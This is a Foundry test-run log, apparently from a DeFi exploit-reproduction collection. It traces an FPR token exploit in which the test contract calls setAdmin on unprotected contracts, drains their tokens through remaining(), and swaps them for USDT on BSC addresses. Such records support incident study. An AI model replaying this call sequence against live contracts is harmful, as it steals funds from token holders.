Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.14s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-12/FPR_exp.sol:36:5:
   |
36 |     IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1582:1:
     |
1582 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 233.17ms (172.75µs CPU time)

Ran 1 test for src/test/2022-12/FPR_exp.sol:ContractTest
[PASS] testExploit() (gas: 520059)
Logs:
  29432442366797
  22889508387395
  5894231724708

Traces:
  [578659] ContractTest::testExploit()
    ├─ [24538] FPR token::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24598] Pair::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [5362] 0x81c5664be54d89E725ef155F14cf34e6213297B7::setAdmin(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [51869] 0x81c5664be54d89E725ef155F14cf34e6213297B7::remaining(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FPR token: [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d])
    │   ├─ [2485] FPR token::balanceOf(0x81c5664be54d89E725ef155F14cf34e6213297B7) [staticcall]
    │   │   └─ ← [Return] 29729739764442 [2.972e13]
    │   ├─ [45388] FPR token::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29729739764442 [2.972e13])
    │   │   ├─ emit Transfer(from: 0x81c5664be54d89E725ef155F14cf34e6213297B7, to: 0x620E57bfa8fB66D037E09697773002590888ea69, value: 297297397644 [2.972e11])
    │   │   ├─ emit Transfer(from: 0x81c5664be54d89E725ef155F14cf34e6213297B7, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 29432442366797 [2.943e13])
    │   │   └─ ← [Return] true
    │   ├─ emit Remaining(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: FPR token: [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d], param2: 29729739764442 [2.972e13], param3: 1671042514 [1.671e9])
    │   └─ ← [Stop] 
    ├─ [485] FPR token::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 29432442366797 [2.943e13]
    ├─ [0] console::log(29432442366797 [2.943e13]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [485] FPR token::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 29432442366797 [2.943e13]
    ├─ [112746] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(29432442366797 [2.943e13], 0, [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1671042514 [1.671e9])
    │   ├─ [34315] FPR token::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], 29432442366797 [2.943e13])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x75b6B567Fa50145549E224c91A44F6467a1eAA26, value: 3549552549435 [3.549e12])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xCdfdf2018b0e46Ab8e53667DFF57d452ADfc4b37, value: 1748287076587 [1.748e12])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], value: 24134602740774 [2.413e13])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457583978480687273138 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2893] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 28145574906864486313296 [2.814e22], 1714100212608 [1.714e12], 1670894450 [1.67e9]
    │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   └─ ← [Return] 25848702953382 [2.584e13]
    │   ├─ [62299] Pair::swap(26274795847172541865812 [2.627e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [27971] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26274795847172541865812 [2.627e22])
    │   │   │   ├─ emit Transfer(from: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 26274795847172541865812 [2.627e22])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 1870779059691944447484 [1.87e21]
    │   │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 25848702953382 [2.584e13]
    │   │   ├─ emit Sync(reserve0: 1870779059691944447484 [1.87e21], reserve1: 25848702953382 [2.584e13])
    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 24134602740774 [2.413e13], amount0Out: 26274795847172541865812 [2.627e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 26274795847172541865812 [2.627e22]
    │   └─ ← [Stop] 
    ├─ [5362] 0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532::setAdmin(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [17169] 0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532::remaining(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FPR token: [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d])
    │   ├─ [2485] FPR token::balanceOf(0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532) [staticcall]
    │   │   └─ ← [Return] 23120715542823 [2.312e13]
    │   ├─ [10688] FPR token::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 23120715542823 [2.312e13])
    │   │   ├─ emit Transfer(from: 0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532, to: 0x620E57bfa8fB66D037E09697773002590888ea69, value: 231207155428 [2.312e11])
    │   │   ├─ emit Transfer(from: 0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 22889508387394 [2.288e13])
    │   │   └─ ← [Return] true
    │   ├─ emit Remaining(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: FPR token: [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d], param2: 23120715542823 [2.312e13], param3: 1671042514 [1.671e9])
    │   └─ ← [Stop] 
    ├─ [485] FPR token::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 22889508387395 [2.288e13]
    ├─ [0] console::log(22889508387395 [2.288e13]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [485] FPR token::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 22889508387395 [2.288e13]
    ├─ [41862] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(22889508387395 [2.288e13], 0, [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1671042514 [1.671e9])
    │   ├─ [13915] FPR token::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], 22889508387395 [2.288e13])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x75b6B567Fa50145549E224c91A44F6467a1eAA26, value: 2760474711519 [2.76e12])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xCdfdf2018b0e46Ab8e53667DFF57d452ADfc4b37, value: 1359636798211 [1.359e12])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], value: 18769396877664 [1.876e13])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457583955591178885743 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 26274795847172541865812 [2.627e22]
    │   ├─ [893] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 1870779059691944447484 [1.87e21], 25848702953382 [2.584e13], 1671042514 [1.671e9]
    │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   └─ ← [Return] 44618099831046 [4.461e13]
    │   ├─ [18315] Pair::swap(785835466600543123553 [7.858e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 785835466600543123553 [7.858e20])
    │   │   │   ├─ emit Transfer(from: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 785835466600543123553 [7.858e20])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 1084943593091401323931 [1.084e21]
    │   │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 44618099831046 [4.461e13]
    │   │   ├─ emit Sync(reserve0: 1084943593091401323931 [1.084e21], reserve1: 44618099831046 [4.461e13])
    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 18769396877664 [1.876e13], amount0Out: 785835466600543123553 [7.858e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 27060631313773084989365 [2.706e22]
    │   └─ ← [Stop] 
    ├─ [5362] 0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3::setAdmin(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [17169] 0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3::remaining(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FPR token: [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d])
    │   ├─ [2485] FPR token::balanceOf(0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3) [staticcall]
    │   │   └─ ← [Return] 5953769418896 [5.953e12]
    │   ├─ [10688] FPR token::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5953769418896 [5.953e12])
    │   │   ├─ emit Transfer(from: 0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3, to: 0x620E57bfa8fB66D037E09697773002590888ea69, value: 59537694188 [5.953e10])
    │   │   ├─ emit Transfer(from: 0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5894231724707 [5.894e12])
    │   │   └─ ← [Return] true
    │   ├─ emit Remaining(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: FPR token: [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d], param2: 5953769418896 [5.953e12], param3: 1671042514 [1.671e9])
    │   └─ ← [Stop] 
    ├─ [485] FPR token::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 5894231724708 [5.894e12]
    ├─ [0] console::log(5894231724708 [5.894e12]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [485] FPR token::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 5894231724708 [5.894e12]
    ├─ [41862] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(5894231724708 [5.894e12], 0, [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1671042514 [1.671e9])
    │   ├─ [13915] FPR token::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], 5894231724708 [5.894e12])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x75b6B567Fa50145549E224c91A44F6467a1eAA26, value: 710844345999 [7.108e11])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xCdfdf2018b0e46Ab8e53667DFF57d452ADfc4b37, value: 350117364447 [3.501e11])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], value: 4833270014261 [4.833e12])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457583949696947161035 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 27060631313773084989365 [2.706e22]
    │   ├─ [893] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 1084943593091401323931 [1.084e21], 44618099831046 [4.461e13], 1671042514 [1.671e9]
    │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   └─ ← [Return] 49451369845307 [4.945e13]
    │   ├─ [18315] Pair::swap(105800793753350000194 [1.058e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 105800793753350000194 [1.058e20])
    │   │   │   ├─ emit Transfer(from: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 105800793753350000194 [1.058e20])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 979142799338051323737 [9.791e20]
    │   │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 49451369845307 [4.945e13]
    │   │   ├─ emit Sync(reserve0: 979142799338051323737 [9.791e20], reserve1: 49451369845307 [4.945e13])
    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 4833270014261 [4.833e12], amount0Out: 105800793753350000194 [1.058e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 27166432107526434989559 [2.716e22]
    │   └─ ← [Stop] 
    ├─ [5362] 0xBa5B235CDDaAc2595bcE6BaB79274F57FB82Bf27::setAdmin(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [34514] 0xBa5B235CDDaAc2595bcE6BaB79274F57FB82Bf27::remaining(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b])
    │   ├─ [2537] Pair::balanceOf(0xBa5B235CDDaAc2595bcE6BaB79274F57FB82Bf27) [staticcall]
    │   │   └─ ← [Return] 146068980000000000 [1.46e17]
    │   ├─ [28003] Pair::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 146068980000000000 [1.46e17])
    │   │   ├─ emit Transfer(from: 0xBa5B235CDDaAc2595bcE6BaB79274F57FB82Bf27, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 146068980000000000 [1.46e17])
    │   │   └─ ← [Return] true
    │   ├─ emit Remaining(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], param2: 146068980000000000 [1.46e17], param3: 1671042514 [1.671e9])
    │   └─ ← [Stop] 
    ├─ [537] Pair::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 146068980000000000 [1.46e17]
    ├─ [103969] Router::removeLiquidity(0x55d398326f99059fF775485246999027B3197955, FPR token: [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d], 146068980000000000 [1.46e17], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1671042514 [1.671e9])
    │   ├─ [25476] Pair::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], 146068980000000000 [1.46e17])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], value: 146068980000000000 [1.46e17])
    │   │   └─ ← [Return] true
    │   ├─ [76136] Pair::burn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 979142799338051323737 [9.791e20]
    │   │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 49451369845307 [4.945e13]
    │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 108010559288522 [1.08e14])
    │   │   ├─ emit Transfer(from: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], to: 0x0000000000000000000000000000000000000000, value: 146068980000000000 [1.46e17])
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 779965900282506902653 [7.799e20])
    │   │   │   ├─ emit Transfer(from: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 779965900282506902653 [7.799e20])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [13443] FPR token::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 39391988816823 [3.939e13])
    │   │   │   ├─ emit Transfer(from: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], to: 0x75b6B567Fa50145549E224c91A44F6467a1eAA26, value: 2375336925654 [2.375e12])
    │   │   │   ├─ emit Transfer(from: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], to: 0xCdfdf2018b0e46Ab8e53667DFF57d452ADfc4b37, value: 1169942067859 [1.169e12])
    │   │   │   ├─ emit Transfer(from: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 35846709823309 [3.584e13])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 199176899055544421084 [1.991e20]
    │   │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   │   └─ ← [Return] 10059381028485 [1.005e13]
    │   │   ├─ emit Sync(reserve0: 199176899055544421084 [1.991e20], reserve1: 10059381028485 [1.005e13])
    │   │   ├─ emit Burn(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 779965900282506902653 [7.799e20], amount1: 39391988816823 [3.939e13], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Return] 779965900282506902653 [7.799e20], 39391988816823 [3.939e13]
    │   └─ ← [Return] 779965900282506902653 [7.799e20], 39391988816823 [3.939e13]
    ├─ [485] FPR token::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 35846709823310 [3.584e13]
    ├─ [41862] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(35846709823310 [3.584e13], 0, [0xA9c7ec037797DC6E3F9255fFDe422DA6bF96024d, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1671042514 [1.671e9])
    │   ├─ [13915] FPR token::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], 35846709823310 [3.584e13])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x75b6B567Fa50145549E224c91A44F6467a1eAA26, value: 4323113204690 [4.323e12])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xCdfdf2018b0e46Ab8e53667DFF57d452ADfc4b37, value: 2129294563504 [2.129e12])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b], value: 29394302055115 [2.939e13])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457583913850237337725 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 27946398007808941892212 [2.794e22]
    │   ├─ [893] Pair::getReserves() [staticcall]
    │   │   └─ ← [Return] 199176899055544421084 [1.991e20], 10059381028485 [1.005e13], 1671042514 [1.671e9]
    │   ├─ [485] FPR token::balanceOf(Pair: [0x039D05a19e3436c536bE5c814aaa70FcdbDde58b]) [staticcall]
    │   │   └─ ← [Return] 39453683083600 [3.945e13]
    │   ├─ [18315] Pair::swap(148298628869130009035 [1.482e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 148298628869130009035 [1.482e20])
